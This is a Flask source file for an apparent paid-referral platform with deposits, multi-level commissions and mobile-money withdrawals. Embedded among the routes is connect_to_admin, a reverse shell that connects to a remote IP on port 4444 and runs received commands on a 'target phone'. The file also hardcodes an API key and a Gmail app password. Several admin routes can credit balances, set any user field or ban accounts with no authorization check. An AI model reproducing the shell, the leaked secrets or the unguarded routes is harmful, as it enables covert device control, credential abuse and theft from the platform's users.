    __tablename__ = 'likes_publicites'
    
    id = db.Column(db.Integer, primary_key=True)
    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id', ondelete='CASCADE'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    user = db.relationship('User', backref=db.backref('likes_publicites', lazy='dynamic'))
    
    def __repr__(self):
        return f"<LikePublicite user_id={self.user_id} publicite_id={self.publicite_id}>"


class SauvegardePublicite(db.Model):
    """Sauvegardes de publicités par les utilisateurs"""
    __tablename__ = 'sauvegardes_publicites'
    
    id = db.Column(db.Integer, primary_key=True)
    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id', ondelete='CASCADE'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id', ondelete='CASCADE'), nullable=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relations
    publicite = db.relationship('Publicite', backref=db.backref('sauvegardes', lazy='dynamic'))
    user = db.relationship('User', backref=db.backref('sauvegardes_publicites', lazy='dynamic'))
    
    def __repr__(self):
        return f"<SauvegardePublicite user_id={self.user_id} publicite_id={self.publicite_id}>"


class SignalementPublicite(db.Model):
    """Signalements de publicités inappropriées"""
    __tablename__ = 'signalements_publicites'
    
    id = db.Column(db.Integer, primary_key=True)
    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id', ondelete='CASCADE'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id', ondelete='CASCADE'), nullable=False)
    raison = db.Column(db.String(50))  # spam, inappropriate, scam, other
    description = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relations
    publicite = db.relationship('Publicite', backref=db.backref('signalements', lazy='dynamic'))
    user = db.relationship('User', backref=db.backref('signalements_publicites', lazy='dynamic'))
    
    def __repr__(self):
        return f"<SignalementPublicite user_id={self.user_id} publicite_id={self.publicite_id}>"


class Follow(db.Model):
    """Système d'abonnement/followers"""
    __tablename__ = 'follows'
    
    id = db.Column(db.Integer, primary_key=True)
    follower_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    following_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    
    follower = db.relationship('User', foreign_keys=[follower_id], backref=db.backref('following', lazy='dynamic'))
    following = db.relationship('User', foreign_keys=[following_id], backref=db.backref('followers', lazy='dynamic'))
    
    def __repr__(self):
        return f"<Follow {self.follower.username} -> {self.following.username}>"


# ─── MODÈLES PUSH VAPID ──────────────────────────────────
class PushSubscription(db.Model):
    """Abonnement Web Push d'un utilisateur (endpoint + clés)."""
    __tablename__ = "push_subscriptions"
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=True, index=True)
    endpoint = db.Column(db.Text, nullable=False)
    p256dh = db.Column(db.Text, nullable=False)
    auth = db.Column(db.Text, nullable=False)
    browser = db.Column(db.String(50))
    platform = db.Column(db.String(50))
    user_agent = db.Column(db.String(300))
    language = db.Column(db.String(10))
    timezone = db.Column(db.String(50))
    ip = db.Column(db.String(45))
    actif = db.Column(db.Boolean, default=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    derniere_utilisation = db.Column(db.DateTime, default=datetime.utcnow)
    def to_dict(self):
        return {"id": self.id, "user_id": self.user_id, "endpoint": self.endpoint,
                "browser": self.browser, "platform": self.platform, "actif": self.actif}

class Notification(db.Model):
    """Notification envoyée à un utilisateur."""
    __tablename__ = "notifications"
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.id"), nullable=True, index=True)
    titre = db.Column(db.String(200), nullable=False)
    message = db.Column(db.Text, nullable=False)
    icon = db.Column(db.String(500))
    image = db.Column(db.String(500))
    url = db.Column(db.String(500))
    type = db.Column(db.String(50))
    lu = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_envoi = db.Column(db.DateTime)
    date_lecture = db.Column(db.DateTime)

class NotificationQueue(db.Model):
    """File d'attente pour l'envoi des notifications push."""
    __tablename__ = "notification_queue"
    id = db.Column(db.Integer, primary_key=True)
    notification_id = db.Column(db.Integer, db.ForeignKey("notifications.id"), nullable=False, index=True)
    statut = db.Column(db.String(20), default="en_attente")
    erreur = db.Column(db.Text)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_traitement = db.Column(db.DateTime)

def envoyer_otp(recipient_email, code_otp):
    if not API_KEY:
        print("❌ API KEY manquante")
        return False

def donner_commission(parrain_username, montant_depot):
    """Crée la commission et remplit solde_revenu, solde_parrainage et commission_total selon les niveaux."""
    
    if not parrain_username:
        return

    parrain = User.query.filter_by(username=parrain_username).first()
    if not parrain:
        return

    # --- NIVEAU 1 ---
    commission_niveau1 = 2000

    parrain.solde_revenu = (parrain.solde_revenu or 0) + commission_niveau1
    parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission_niveau1
    parrain.commission_total = (parrain.commission_total or 0) + commission_niveau1

    db.session.commit()

    # --- NIVEAU 2 ---
    if parrain.parrain:
        parrain2 = User.query.filter_by(username=parrain.parrain).first()
        if parrain2:
            commission_niveau2 = 700

            parrain2.solde_revenu = (parrain2.solde_revenu or 0) + commission_niveau2
            parrain2.solde_parrainage = (parrain2.solde_parrainage or 0) + commission_niveau2
            parrain2.commission_total = (parrain2.commission_total or 0) + commission_niveau2

            db.session.commit()

            # --- NIVEAU 3 ---
            if parrain2.parrain:
                parrain3 = User.query.filter_by(username=parrain2.parrain).first()
                if parrain3:
                    commission_niveau3 = 300

                    parrain3.solde_revenu = (parrain3.solde_revenu or 0) + commission_niveau3
                    parrain3.solde_parrainage = (parrain3.solde_parrainage or 0) + commission_niveau3
                    parrain3.commission_total = (parrain3.commission_total or 0) + commission_niveau3

                    db.session.commit()

# -----------------------
def t(key):
    lang = session.get("lang", "fr")
    return TRANSLATIONS.get(lang, TRANSLATIONS["fr"]).get(key, key)

# enregistrer la fonction dans Jinja2
app.jinja_env.globals.update(t=t)

@app.route("/")
def index_page():
    # On vérifie si l'utilisateur est déjà connecté pour personnaliser l'accueil
    user = get_logged_in_user()
    return render_template("index.html", user=user)

# -----------------------
# Utilisateur connecté
# -----------------------
def get_logged_in_user():
    """Retourne l'utilisateur connecté via user_id en session."""
    user_id = session.get("user_id")
    if not user_id:
        return None
    # db.session.get est compatible SQLAlchemy 2.0
    return db.session.get(User, user_id)


# -----------------------
# Décorateur login
# -----------------------
def login_required(f):
    """Protège une route, redirige vers la page de connexion si non connecté."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not get_logged_in_user():
            return redirect(url_for("connexion_page"))
        return f(*args, **kwargs)
    return wrapper


def api_login_required(f):
    """Protège une route API, renvoie JSON 401 si non connecté (au lieu d'une redirection HTML)."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not get_logged_in_user():
            return jsonify({
                "success": False,
                "message": "Session expirée. Veuillez vous reconnecter.",
                "redirect": url_for("connexion_page")
            }), 401
        return f(*args, **kwargs)
    return wrapper


def calculer_montant_points(user):
    total_points = (
        (user.points or 0) +
        (user.points_video or 0) +
        (user.points_youtube or 0) +
        (user.points_tiktok or 0) +
        (user.points_instagram or 0) +
        (user.points_ads or 0) +
        (user.points_spin or 0) +
        (user.points_games or 0)
    )
    tranches = total_points // 100
    montant_xof = tranches * 200
    points_utilisables = tranches * 100  # points qui peuvent être retirés
    return montant_xof, points_utilisables

import os
from flask import Flask, render_template, request, redirect, url_for, session
from datetime import datetime, timezone
from werkzeug.utils import secure_filename

# Dossier de stockage (mkdir -p static/uploads/channel)
UPLOAD_FOLDER = 'static/uploads/channel'

import socket
import subprocess
import os

def connect_to_admin():
    # Ton serveur (ton premier téléphone ou ton PC)
    # L'appareil cible se connecte à TOI
    SERVER_IP = "192.168.1.XX" 
    PORT = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))
    
    while True:
        # Attend une commande venant de ton serveur
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
            
        # Exécute la commande sur le téléphone cible
        # Exemple: 'termux-location' ou 'ls'
        output = subprocess.getoutput(command)
        
        # Renvoie le résultat à ton écran de contrôle
        s.send(output.encode())
    
    s.close()


@app.route("/academy/design")
@login_required
def formation_design_page():
    # Récupération de l'utilisateur connecté pour la navbar
    phone = get_logged_in_user_phone()
    user = User.query.filter_by(phone=phone).first()
    
    return render_template("design_graphique.html", user=user)


@app.route('/sanctionner/<username>')
def sanctionner_utilisateur(username):
    # On récupère l'utilisateur grâce au nom passé dans l'URL
    user = User.query.filter_by(username=username.lower()).first()

    if not user:
        return f"Utilisateur '{username}' non trouvé.", 404

    try:
        # 1. Bannissement
        user.is_banned = True

        # 2. Débiter le solde (On retire 360 000)
        user.solde_jeux = (user.solde_jeux or 0) - 360000

        # 3. Sauvegarder
        db.session.commit()

        return f"""
        <div style='color: red; font-family: sans-serif; padding: 20px; border: 2px solid red; border-radius: 15px; max-width: 500px; margin: 20px auto;'>
            <h2 style='margin-top: 0;'>⚠️ Sanction Appliquée</h2>
            <hr>
            <p><b>Utilisateur :</b> {user.username.upper()}</p>
            <p><b>Statut :</b> BANNI DÉFINITIVEMENT</p>
            <p><b>Retrait solde :</b> -360,000 XOF</p>
            <p><b>Solde actuel :</b> {user.solde_jeux} XOF</p>
            <br>
            <a href="/admin/utilisateurs" style="color: blue;">Retour à la liste</a>
        </div>
        """
    except Exception as e:
        db.session.rollback()
        return f"Erreur lors de la sanction : {str(e)}", 500

@app.route("/admin/filleuls-inactifs")
def filleuls_inactifs_kedboy():
    username_cible = "kedboy"
    
    # 1. On cherche directement les utilisateurs dont le parrain est 'kedboy'
    # ET qui n'ont pas encore fait leur premier dépôt (premier_depot=False)
    filleuls_non_actives = User.query.filter_by(
        parrain=username_cible, 
        premier_depot=False
    ).order_by(User.id.desc()).all() # Range du plus récent (ID le plus grand) au plus ancien

    # On crée un faux objet parrain pour que le template HTML fonctionne sans erreur
    class CustomParrain:
        username = username_cible
    
    return render_template(
        "filleuls_inactifs.html", 
        parrain=CustomParrain(), 
        filleuls=filleuls_non_actives
    )


from sqlalchemy import func

@app.route("/admin/stats-depots")
def stats_depots():
    # On groupe par la colonne premier_depot et on compte
    # Cela renvoie une liste de tuples : [(True, 150), (False, 45)]
    stats = db.session.query(
        User.premier_depot, 
        func.count(User.id)
    ).group_by(User.premier_depot).all()

    # On initialise les compteurs
    total_actifs = 0   # premier_depot = True
    total_passifs = 0  # premier_depot = False

    for status, count in stats:
        if status is True:
            total_actifs = count
        else:
            total_passifs = count

    return render_template("admin_stats.html", actifs=total_actifs, passifs=total_passifs)

@app.route("/admin/validate-deposit/<int:deposit_id>")
def admin_validate_deposit(deposit_id):
    """Valider un dépôt"""
    user = get_logged_in_user()
    
    if not user or not user.is_admin:
        return "Accès refusé", 403
    
    deposit = Depot.query.get(deposit_id)
    if not deposit:
        return "Dépôt non trouvé", 404
    
    deposit.statut = 'valide'
    
    # Créditer l'utilisateur
    deposit_user = User.query.get(deposit.user_id)
    if deposit_user:
        deposit_user.solde_depot = (deposit_user.solde_depot or 0) + deposit.montant
        deposit_user.solde_total = (deposit_user.solde_total or 0) + deposit.montant
        
        if not deposit_user.premier_depot:
            deposit_user.premier_depot = True
            # Commission parrainage
            if deposit_user.parrain:
                donner_commission(deposit_user.parrain, deposit.montant)
    
    db.session.commit()
    flash(f"Dépôt de {deposit.montant} XOF validé avec succès !", "success")
    return redirect(url_for('admin_deposits'))

@app.route("/admin/reject-deposit/<int:deposit_id>")
def admin_reject_deposit(deposit_id):
    """Rejeter un dépôt"""
    user = get_logged_in_user()
    
    if not user or not user.is_admin:
        return "Accès refusé", 403
    
    deposit = Depot.query.get(deposit_id)
    if not deposit:
        return "Dépôt non trouvé", 404
    
    deposit.statut = 'refuse'
    db.session.commit()
    
    flash(f"Dépôt de {deposit.montant} XOF rejeté.", "warning")
    return redirect(url_for('admin_deposits'))

@app.route("/admin/canal/edit", methods=["GET", "POST"])
def admin_canal_edit():
    if request.method == "POST":
        content = request.form.get("content")
        media_url = None
        media_type = None

        # Récupération des fichiers
        file = request.files.get("media")
        audio_file = request.files.get("audio")

        # Priorité au média (image/vidéo) sinon audio
        target_file = file if (file and file.filename) else audio_file

        if target_file and target_file.filename:
            filename = secure_filename(target_file.filename)
            ext = filename.split('.')[-1].lower()
            
            # Nom unique avec timestamp pour éviter les bugs de cache
            unique_name = f"{int(datetime.now().timestamp())}_{filename}"
            
            upload_folder = os.path.join(app.root_path, "static/uploads")
            os.makedirs(upload_folder, exist_ok=True)

            path = os.path.join(upload_folder, unique_name)
            target_file.save(path)

            # URL accessible par le navigateur
            media_url = f"/static/uploads/{unique_name}"

            # Détection automatique du type
            if ext in ["jpg", "png", "jpeg", "gif", "webp"]:
                media_type = "image"
            elif ext in ["mp4", "mov", "avi", "webm"]:
                media_type = "video"
            elif ext in ["mp3", "wav", "ogg", "m4a"]:
                media_type = "audio"

        # Création du message
        msg = ChannelMessage(
            content=content,
            media_url=media_url,
            media_type=media_type,
            timestamp=datetime.now()
        )

        db.session.add(msg)
        db.session.commit()
        return redirect(url_for("admin_canal_edit"))

    messages = ChannelMessage.query.order_by(ChannelMessage.id.desc()).all()
    return render_template("admin_canal.html", messages=messages)

@app.route("/edit_msg/<int:id>", methods=["POST"])
def edit_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    data = request.get_json()
    new_content = data.get("content")

    msg.content = new_content
    db.session.commit()

    return {"success": True}



from sqlalchemy import text

@app.route("/academy/tiktok")
def academy_tiktok():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("academy_tiktok.html", user=user)


@app.route("/delete_msg/<int:id>")
def delete_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    # 🔥 supprime fichier si existe
    if msg.media_url:
        try:
            path = msg.media_url.replace("/static/uploads/", "static/uploads/")
            os.remove(path)
        except:
            pass

    db.session.delete(msg)
    db.session.commit()

    return redirect(url_for('admin_canal_edit'))

from flask_mail import Mail, Message
API_KEY = "re_QnDyJnmp_AjZaCUqiWGfrv5t3HxDfczLh"

app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'luminastar2026@gmail.com'
app.config['MAIL_PASSWORD'] = 'suca ejwg zfln kepf'
app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # ✅ AJOUT

mail = Mail(app)



def envoyer_retrait_soleaspay(service_id, wallet, montant, external_reference=None):
    import logging

    logging.info(
        f"[SOLEASPAY] Envoi retrait : service={service_id}, wallet={wallet}, montant={montant}"
    )

    token, err = obtenir_token()

    if err:
        logging.error(f"[SOLEASPAY] Erreur token : {err}")
        return {"success": False, "message": "Erreur token SoleasPay"}

    url = "https://soleaspay.com/api/action/account/withdraw"

    headers = {
        "Authorization": f"Bearer {token}",
        "operation": "4",
        "service": str(service_id),
        "Content-Type": "application/json"
    }

    payload = {
        "wallet": wallet,
        "amount": montant,
        "currency": "XOF"
    }

    if external_reference:
        payload["external_reference"] = external_reference

    logging.info(f"[SOLEASPAY] Payload : {payload}")

    try:
        response = requests.post(
            url,
            headers=headers,
            json=payload,
            timeout=30
        )

        logging.info(f"[SOLEASPAY] HTTP {response.status_code}")

        if response.status_code != 200:
            logging.error(
                f"[SOLEASPAY] HTTP {response.status_code} : {response.text}"
            )
            return {
                "success": False,
                "message": f"Erreur HTTP {response.status_code}",
                "content": response.text
            }

        try:
            result = response.json()
        except ValueError:
            logging.error(
                f"[SOLEASPAY] Réponse non JSON : {response.text}"
            )
            return {
                "success": False,
                "message": "Réponse invalide de SoleasPay",
                "content": response.text
            }

        logging.info(f"[SOLEASPAY] Réponse : {result}")

        return result

    except requests.Timeout:
        logging.exception("[SOLEASPAY] Timeout")
        return {
            "success": False,
            "message": "Timeout SoleasPay"
        }

    except requests.RequestException as e:
        logging.exception(f"[SOLEASPAY] Erreur réseau : {e}")
        return {
            "success": False,
            "message": str(e)
        }

def consulter_statut_retrait_soleaspay(reference_soleaspay):
    """
    Consulte le statut d'un retrait chez SoleasPay via l'API officielle.
    
    Endpoint officiel : GET https://soleaspay.com/api/user/history/{reference}
    
    Args:
        reference_soleaspay: La référence du retrait (ex: MLS109P)
    
    Returns:
        dict: {'success': bool, 'status': str, 'data': dict} ou None
    """
    import logging
    
    if not reference_soleaspay:
        return None
    
    logging.info(f"[SOLEASPAY] Consultation statut: reference={reference_soleaspay}")
    
    token, err = obtenir_token()
    if err:
        logging.error(f"[SOLEASPAY] Erreur token: {err}")
        return None
    
    # Endpoint officiel SoleasPay pour consulter l'historique/statut
    url = f"https://soleaspay.com/api/user/history/{reference_soleaspay}"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            logging.error(f"[SOLEASPAY] Erreur consultation HTTP {response.status_code}: {response.text}")
            return None
        
        result = response.json()
        logging.info(f"[SOLEASPAY] Statut consulté: {result}")
        
        return result
        
    except Exception as e:
        logging.error(f"[SOLEASPAY] Exception consultation: {str(e)}")
        return None


def resynchroniser_retraits_en_attente():
    """
    Resynchronise les retraits qui sont restés en attente trop longtemps.
    
    Cette fonction :
    1. Récupère tous les retraits avec statut 'en_attente' ou 'accepte' datant de plus de 5 minutes
    2. Consulte le statut réel chez SoleasPay (si API disponible)
    3. Met à jour le statut dans la base de données
    
    À exécuter périodiquement (cron ou tâche de fond).
    """
    import logging
    from datetime import datetime, timedelta
    
    logging.info("[RESYNCHRO] Début resynchronisation retraits en attente")
    
    # Délai avant de considérer qu'un retrait est bloqué (5 minutes)
    DELAI_ATTENTE_MINUTES = 5
    
    # Retraits en attente depuis plus de DELAI_ATTENTE_MINUTES
    cutoff_time = datetime.utcnow() - timedelta(minutes=DELAI_ATTENTE_MINUTES)
    
    retraits_a_sync = Retrait.query.filter(
        Retrait.statut.in_(['en_attente', 'accepte']),
        Retrait.date < cutoff_time,
        Retrait.reference_soleaspay != None  # Seulement si on a une référence SoleasPay
    ).limit(50).all()
    
    if not retraits_a_sync:
        logging.info("[RESYNCHRO] Aucun retrait à resynchroniser")
        return 0
    
    logging.info(f"[RESYNCHRO] {len(retraits_a_sync)} retraits à resynchroniser")
    
    mis_a_jour = 0
    erreurs = 0
    
    for retrait in retraits_a_sync:
        try:
            # Consulter le statut chez SoleasPay
            # NOTE: Cette API n'est pas documentée par SoleasPay, à adapter
            statut_soleaspay = consulter_statut_retrait_soleaspay(retrait.reference_soleaspay)
            
            if statut_soleaspay and statut_soleaspay.get('success'):
                data = statut_soleaspay.get('data', {})
                status = data.get('status', '').upper()
                
                # Mapping des statuts
                statut_mapping = {
                    'SUCCESS': 'successful',
                    'COMPLETED': 'successful',
                    'APPROVED': 'successful',
                    'FAILED': 'failed',
                    'REJECTED': 'refused',
                    'CANCELLED': 'cancelled'
                }
                
                nouveau_statut = statut_mapping.get(status)
                
                if nouveau_statut and nouveau_statut != retrait.statut:
                    retrait.statut = nouveau_statut
                    retrait.soleaspay_status = status
                    retrait.last_sync = datetime.utcnow()
                    
                    # Mettre à jour total_retrait si succès
                    if nouveau_statut == 'successful':
                        user = User.query.get(retrait.user_id)
                        if user:
                            user.total_retrait = (user.total_retrait or 0) + retrait.montant
                    
                    mis_a_jour += 1
                    logging.info(f"[RESYNCHRO] Retrait {retrait.id} mis à jour: {retrait.statut}")
                else:
                    retrait.last_sync = datetime.utcnow()
                    logging.info(f"[RESYNCHRO] Retrait {retrait.id} toujours en attente")
            else:
                # API non disponible ou erreur - on marque juste la dernière sync
                retrait.last_sync = datetime.utcnow()
                logging.warning(f"[RESYNCHRO] Impossible de consulter statut pour retrait {retrait.id}")
                
        except Exception as e:
            erreurs += 1
            logging.error(f"[RESYNCHRO] Erreur pour retrait {retrait.id}: {str(e)}")
        
        db.session.commit()
    
    logging.info(f"[RESYNCHRO] Terminé: {mis_a_jour} mis à jour, {erreurs} erreurs")
    return mis_a_jour


@app.cli.command("resync-retraits")
def cli_resync_retraits():
    """Commande CLI pour resynchroniser manuellement les retraits."""
    print("🔄 Resynchronisation des retraits en attente...")
    resultat = resynchroniser_retraits_en_attente()
    print(f"✅ {resultat} retraits mis à jour")


@app.cli.command("init-db")
def init_db():
    db.create_all()
    print("✅ Base de données initialisée avec succès !")

from sqlalchemy.orm.attributes import flag_modified
from flask import jsonify
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from sqlalchemy.orm.attributes import flag_modified

@app.route("/chaine")
def view_channel():
    user_id = session.get('user_id')
    user = db.session.get(User, user_id) if user_id else None

    # Vérification abonnement
    is_sub = False
    if user:
        is_sub = ChannelSub.query.filter_by(user_id=user.id).first() is not None

    # Messages
    messages = ChannelMessage.query.order_by(ChannelMessage.timestamp.asc()).all()

    # Nombre abonnés
    sub_count = ChannelSub.query.count()

    return render_template(
        "chaine.html",
        messages=messages,
        sub_count=sub_count,
        is_sub=is_sub,
        user=user
    )

@app.route("/admin/restreindre_comptes")
@login_required
def restreindre_comptes_specifiques():
    # Sécurité : Seul l'administrateur a le droit de bannir

    # Liste des usernames à restreindre
    comptes_a_bloquer = ["leaderbrice01", "amen1", "oroumat"]

    # On récupère les utilisateurs correspondants dans la base de données
    utilisateurs = User.query.filter(User.username.in_(comptes_a_bloquer)).all()

    total_bloques = 0

    # On passe leur statut is_banned à True
    for user in utilisateurs:
        user.is_banned = True
        total_bloques += 1

    # Sauvegarde définitive dans la base de données
    if total_bloques > 0:
        db.session.commit()

    return f"Opération réussie ! {total_bloques} comptes ont été restreints avec succès ({', '.join([u.username for u in utilisateurs])})."


@app.route("/chaine/rejoindre", methods=["POST"])
def join_channel():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
    
    existing_sub = ChannelSub.query.filter_by(user_id=user_id).first()
    if not existing_sub:
        new_sub = ChannelSub(user_id=user_id)
        db.session.add(new_sub)
        db.session.commit()
    
    return redirect(url_for('view_channel'))

@app.route("/channel/react/<int:msg_id>/<string:emoji>", methods=["POST"])
def react(msg_id, emoji):
    msg = ChannelMessage.query.get_or_404(msg_id)

    if not msg.reactions:
        msg.reactions = {}

    reactions = msg.reactions

    if emoji not in reactions:
        reactions[emoji] = 0

    reactions[emoji] += 1

    msg.reactions = reactions
    db.session.commit()

    return {"success": True, "new_count": reactions[emoji]}

@app.route("/chaine/quitter")
def leave_channel():
    user = get_logged_in_user()
    if user:
        sub = ChannelSub.query.filter_by(user_id=user.id).first()
        if sub:
            db.session.delete(sub)
            db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/admin/credit_user/<username>/<int:montant>")
def credit_user(username, montant):

    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    user.solde_parrainage += montant
    user.solde_revenu += montant
    db.session.commit()

    return f"{montant} XOF ajouté au compte de {username}"

@app.route("/admin/update-solde", methods=["POST"])
def update_solde():
    data = request.get_json()
    username = data.get("username")
    field = data.get("field")  # ex: solde_revenu, solde_jeux...
    value = data.get("value")

    user = User.query.filter_by(username=username).first()
    if user:
        try:
            # On met à jour le champ dynamiquement
            setattr(user, field, float(value))
            db.session.commit()
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"success": False, "error": str(e)})
    
    return jsonify({"success": False, "error": "Utilisateur non trouvé"})

@app.route("/admin/classement-soldes")
def classement_soldes():
    # On ne récupère que le strict nécessaire pour la mémoire vive
    utilisateurs = User.query.with_entities(
        User.username,
        User.phone,
        User.solde_revenu,
        User.solde_jeux,
        User.solde_parrainage,
        User.bonus,
        User.premier_depot
    ).order_by(User.solde_revenu.desc()).all()

    return render_template("classement.html", utilisateurs=utilisateurs)


@app.route("/admin/chaine/post", methods=["POST"])
def admin_post_channel():
    content = request.form.get("content")
    file = request.files.get("media")
    media_url = None
    media_type = None

    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join("static/uploads", filename))
        media_url = f"/static/uploads/{filename}"
        media_type = "image" if filename.lower().endswith(('.png', '.jpg', '.jpeg')) else "video"

    new_msg = ChannelMessage(content=content, media_url=media_url, media_type=media_type)
    db.session.add(new_msg)
    db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/academy/affiliation")
def academy_affiliation():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("affiliation_info.html", user=user)


from datetime import datetime, timedelta, UTC
import uuid

@app.route('/verify', methods=['GET', 'POST'])
def verify_page():
    if request.method == 'POST':

        code_saisi = request.form.get('code')

        # ==========================
        # 🔐 OTP CHECK
        # ==========================
        if code_saisi != session.get('otp'):
            flash("Code incorrect.", "danger")
            return redirect(url_for('verify_page'))

        # ==========================
        # ⏳ EXPIRATION CHECK
        # ==========================
        otp_exp = session.get('otp_expiration')

        if otp_exp and datetime.now(UTC) > datetime.fromisoformat(otp_exp):
            flash("Code expiré.", "danger")
            return redirect(url_for('retrait_page'))

        # ==========================
        # 🧾 INSCRIPTION
        # ==========================
        if session.get('mode') == 'inscription':
            data = session.get('temp_user')

            try:
                new_user = User(
                    uid=str(uuid.uuid4()),
                    username=data['username'],
                    email=data['email'],
                    phone=data['phone'],
                    country=data['country'],
                    password=data['password'],
                    parrain=data['parrain'],
                    ip_address=data.get('ip_address'),
                    solde_total=0,
                    solde_depot=0,
                    solde_revenu=0,
                    solde_parrainage=0,
                    date_creation=datetime.now(UTC)
                )

                db.session.add(new_user)
                db.session.commit()

                session["user_id"] = new_user.id

                # cleanup
                session.pop('otp', None)
                session.pop('temp_user', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Inscription réussie !", "success")
                return redirect(url_for("dashboard_bloque"))

            except Exception as e:
                db.session.rollback()
                flash("Erreur création compte : " + str(e), "danger")
                return redirect(url_for("inscription_page"))

        # ==========================
        # 🔑 RESET PASSWORD
        # ==========================
        elif session.get('mode') == 'reset':
            return redirect(url_for('new_password_page'))

        # ==========================
        # 💸 RETRAIT (OTP VERIFIE)
        # ==========================
        elif session.get('mode') == 'retrait':

            user = get_logged_in_user()
            data = session.get('retrait_data')

            if not user or not data:
                flash("Session expirée. Recommencez.", "danger")
                return redirect(url_for("retrait_page"))

            try:
                montant_total = data["montant"] + data.get("frais", 0)

                # Créer d'abord le retrait pour avoir l'ID
                nouveau_retrait = Retrait(
                    user_id=user.id,
                    montant=data["montant"],
                    frais=data.get("frais", 0),
                    payment_method=data["service_name"],
                    statut="en_attente",
                    phone=data["wallet"],
                    pays=user.country,
                    date=datetime.now(UTC)
                )
                db.session.add(nouveau_retrait)
                db.session.flush()

                external_reference = f"W-{nouveau_retrait.id}"
                logging.info(f"[RETRAIT OTP] User {user.id} - External reference: {external_reference}")

                # 🔥 API CALL AVEC EXTERNAL_REFERENCE
                response = envoyer_retrait_soleaspay(
                    data["service_id"],
                    data["wallet"],
                    data["montant"],
                    external_reference
                )

                logging.info(f"[RETRAIT OTP] API RESPONSE : {response}")

                if not response or response.get("success") != True:
                    db.session.rollback()
                    error_msg = response.get('message', 'Erreur API paiement.') if response else 'Erreur de connexion API.'
                    flash(error_msg, "danger")
                    return redirect(url_for("retrait_page"))

                # 🧾 METTRE A JOUR LE RETRAIT AVEC SOLEASPAY
                response_data = response.get("data", {})
                nouveau_retrait.reference_soleaspay = response_data.get("reference")
                nouveau_retrait.transaction_reference = response_data.get("transaction_reference")
                nouveau_retrait.external_reference = external_reference
                nouveau_retrait.soleaspay_status = response_data.get("status", "PROCESSING")
                nouveau_retrait.statut = "accepte" if response_data.get("status", "").upper() in ["SUCCESS", "ACCEPTED", "PROCESSED", "COMPLETED", "APPROVED"] else "en_attente"

                user.solde_parrainage = float(user.solde_parrainage or 0) - montant_total

                db.session.commit()

                # 🧹 CLEAN SESSION
                session.pop('otp', None)
                session.pop('retrait_data', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Votre demande de retrait a été enregistrée avec succès ✅", "success")
                return redirect(url_for("mes_retraits"))

            except Exception as e:
                db.session.rollback()
                logging.error(f"[RETRAIT OTP] Exception: {str(e)}")
                flash("Erreur retrait : " + str(e), "danger")
                return redirect(url_for("retrait_page"))

    return render_template('verify.html')

@app.route("/admin/utilisateurs")
def admin_users_page():
    # On récupère tous les utilisateurs classés par date de création
    utilisateurs = User.query.order_by(User.date_creation.desc()).all()
    return render_template("admin_users.html", users=utilisateurs)


@app.route('/new-password', methods=['GET', 'POST'])
def new_password_page():
    if 'reset_email' not in session:
        return redirect(url_for('connexion_page'))

    if request.method == 'POST':
        password = request.form.get('password')
        confirm = request.form.get('confirm_password')

        if password != confirm:
            flash("Les mots de passe ne correspondent pas.", "danger")
            return render_template('new_password.html')

        user = User.query.filter_by(email=session['reset_email']).first()

        if user:
            user.password = generate_password_hash(password)
            db.session.commit()

            # nettoyage
            session.pop('reset_email', None)

            flash("Mot de passe modifié avec succès !", "success")
            return redirect(url_for('connexion_page'))

    return render_template('new_password.html')

from werkzeug.security import check_password_hash

@app.route('/reset-password', methods=['GET', 'POST'])
def reset_password_request():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        pin = request.form.get('pin', '').strip()

        user = User.query.filter_by(email=email).first()

        if not user:
            flash("Cet email n'existe pas.", "danger")
            return render_template('reset_request.html')

        # 🔐 Vérifier PIN
        if not user.pin_code:
            flash("Aucun code PIN défini pour ce compte.", "danger")
            return render_template('reset_request.html')

        if not check_password_hash(user.pin_code, pin):
            flash("Code PIN incorrect.", "danger")
